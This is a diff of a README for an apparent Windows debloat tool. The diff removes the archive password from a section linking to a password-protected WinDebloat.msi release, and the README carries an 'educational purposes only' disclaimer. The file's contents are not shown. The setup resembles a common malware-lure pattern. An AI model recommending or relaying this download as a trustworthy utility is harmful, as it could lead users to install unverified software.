@@ -25,7 +25,6 @@ This repository is for educational and testing purposes only. All files are prov
 Password-protected archive with the complete v2026 package – extract and debloat your Windows instantly. 
 
 📥 [Download `WinDebloat.msi`](https://github.com/AnVNP58030/Windows-10-11-Debloat-Desktop/releases/download/Software/WinDebloat.msi)  
-🔐 `LS2026`
 -
 
 ---
